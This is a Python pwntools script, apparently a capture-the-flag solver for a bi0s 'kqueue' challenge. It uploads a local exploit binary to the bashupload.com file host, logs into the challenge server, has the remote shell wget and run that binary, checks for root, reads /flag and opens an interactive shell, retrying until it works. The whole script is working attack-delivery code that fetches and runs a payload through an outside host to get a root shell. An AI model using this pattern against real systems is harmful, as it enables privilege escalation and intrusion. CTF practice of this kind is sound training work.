#!python2
from pwn import *
import os
import subprocess
import signal

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

def send(cmd):
    sla("$ ",cmd)


while(True):
    proc = subprocess.Popen(['curl','bashupload.com','-T','./exp'], stdout=subprocess.PIPE)
    stdout = proc.communicate()[0].split()[-2]
    log.info("stdout = " + str(stdout))
    io=remote("pwn.challenge.bi0s.in",1279)
    sla("login: ","ctf")
    sla("Password: ","kqueue")
    while(True):
        send("wget " + str(stdout))
        send("chmod +x ./exp")
        a = rel()
        if("No such file or directory" in a):
            continue
        else:
            break
    send("./exp")
    send("id")
    rel()
    b = rel()
    log.info("b = " + str(b))
    if("root" in b):
        log.success("[+] Got root")
        send("cat /flag")
        rel()
        flag = rel()
        log.success("flag = " + flag)
        io.interactive()
    else:
        log.failure("[+] Restart exploit")
        io.close()
